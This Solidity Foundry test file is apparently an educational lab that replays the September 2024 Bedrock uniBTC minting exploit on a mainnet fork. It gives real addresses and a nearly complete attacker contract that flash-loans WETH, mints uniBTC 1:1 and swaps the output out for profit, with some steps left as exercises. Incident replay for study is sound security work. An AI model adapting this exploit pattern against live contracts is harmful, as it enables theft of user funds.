// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

/*
Lab: Bedrock DeFi uniBTC Minting Exploit

Background:
- Date: September 26, 2024
- Impact: ~$1.7M stolen via ETH -> uniBTC arbitrage
- Root Cause: Logical error in supply calculation allowing ETH to uniBTC minting at 1:1 ratio

Key Learning Points:
1. Understanding logical errors in supply calculations
2. How unaudited upgrades can introduce vulnerabilities
3. Using flash loans to maximize exploit impact
4. Importance of proper token registration

Instructions:
1. Read the comments carefully
2. Fill in the marked TODOs
3. Run `forge test --match-contract Bedrock_DeFi_test -vvv`
4. You should successfully mint uniBTC with ETH and profit from the price difference
*/

// @KeyInfo - Total Lost : ~1.7M US$
// Attacker : https://etherscan.io/address/0x2bFB373017349820dda2Da8230E6b66739BE9F96
// Attack Contract : https://etherscan.io/address/0x0C8da4f8B823bEe4D5dAb73367D45B5135B50faB
// Vulnerable Contract : https://etherscan.io/address/0x047D41F2544B7F63A8e991aF2068a363d210d6Da
// Attack Tx : https://etherscan.io/tx/0x725f0d65340c859e0f64e72ca8260220c526c3e0ccde530004160809f6177940

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x702696b2aa47fd1d4feaaf03ce273009dc47d901#code
// L2417-2420, mint() function

// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contrasts involved
address constant uniBTC = 0x004E9C3EF86bc1ca1f0bB5C7662861Ee93350568;
address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
address constant uniV3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
address constant balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

// Implementation: https://etherscan.io/address/0x702696b2aa47fd1d4feaaf03ce273009dc47d901#code
address constant VulVault = 0x047D41F2544B7F63A8e991aF2068a363d210d6Da;

contract Bedrock_DeFi_test is Test {
    address attacker = makeAddr("attacker");
    Attacker attackerC;

    function setUp() public {
        // Fork mainnet just before the attack block
        vm.createSelectFork("mainnet", 20836584 - 1);
    }

    function testPoCMinimal() public {
        // Fund Attacker
        // TODO Exercise: Give attacker initial ETH
        // Hint: Use vm.deal() to give 200 ETH
        // YOUR CODE HERE

        // Start acting as attacker
        vm.startPrank(attacker);

        // Log starting balance in uniBTC
        console.log("Initial balance in uniBTC :", IFS(uniBTC).balanceOf(attacker));

        // STEP 2: Exploit the mint function
        // TODO Exercise 1: Call mint() with ETH value to get uniBTC
        // Hint: The mint function accepts ETH and should give uniBTC 1:1
        // YOUR CODE HERE, IFS(VulVault) ....

        // The attacker received 200 uniBTC(~BTC) for 200 ETH
        console.log("Final balance in uniBTC :", IFS(uniBTC).balanceOf(attacker));
    }

    // Full POC replicating actual attack with flash loan
    function testPoCReplicate() public {
        vm.startPrank(attacker);
        attackerC = new Attacker();

        attackerC.attack();

        console.log("Final balance in WETH :", IFS(weth).balanceOf(attacker));
    }
}

contract Attacker {
    address txSender;

    function attack() external {
        txSender = msg.sender;

        // Approve token transfers
        // Need to approve router to swap our tokens
        IFS(uniBTC).approve(uniV3Router, type(uint256).max);
        IFS(WBTC).approve(uniV3Router, type(uint256).max);

        // Flash loan 30.8 ETH from balancerVault
        address[] memory tokens = new address[](1);
        tokens[0] = weth;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 30.8 ether;
        IFS(balancerVault).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // Withdraw the flash loaned WETH to ETH (native token)
        IFS(weth).withdraw(amounts[0]);

        // Mint uniBTC with the ETH
        IFS(VulVault).mint{value: address(this).balance}();
        uint256 bal_uniBTC = IFS(uniBTC).balanceOf(address(this));

        // Swap uniBTC to WBTC
        IFS.ExactInputSingleParams memory input = IFS.ExactInputSingleParams(
            uniBTC, // address tokenIn;
            WBTC, // address tokenOut;
            500, // uint24 fee;
            address(this), // address recipient;
            block.timestamp, // uint256 deadline;
            bal_uniBTC, // uint256 amountIn;
            0, // uint256 amountOutMinimum;
            0 // uint160 sqrtPriceLimitX96;
        );

        // Execute swap
        IFS(uniV3Router).exactInputSingle(input);

        // Get WBTC balance
        uint256 balWBTC = IFS(WBTC).balanceOf(address(this));

        // Swap WBTC to WETH
        input = IFS.ExactInputSingleParams(
            WBTC, // address tokenIn;
            weth, // address tokenOut;
            500, // uint24 fee;
            address(this), // address recipient;
            block.timestamp, // uint256 deadline;
            balWBTC, // uint256 amountIn;
            0, // uint256 amountOutMinimum;
            0 // uint160 sqrtPriceLimitX96;
        );

        // Execute swap
        IFS(uniV3Router).exactInputSingle(input);

        // Repay flashloan of 30.8 ETH
        // TODO Exercise: Repay the flash loan
        // Hint: Transfer the flash loaned amount back to balancerVault IFS(weth).transfer(destination,amountToreturn);
        // YOUR CODE HERE

        // (Profits) Transfer remaining WETH to txSender
        uint256 bal_weth = IFS(weth).balanceOf(address(this));
        IFS(weth).transfer(txSender, bal_weth);
    }

    receive() external payable {}
}

interface IFS is IERC20 {
    // balancerVault
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

    // WETH
    function withdraw(uint wad) external;

    // Vulnerable Vault
    function mint() external payable;

    // Uniswap V3: SwapRouter
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}
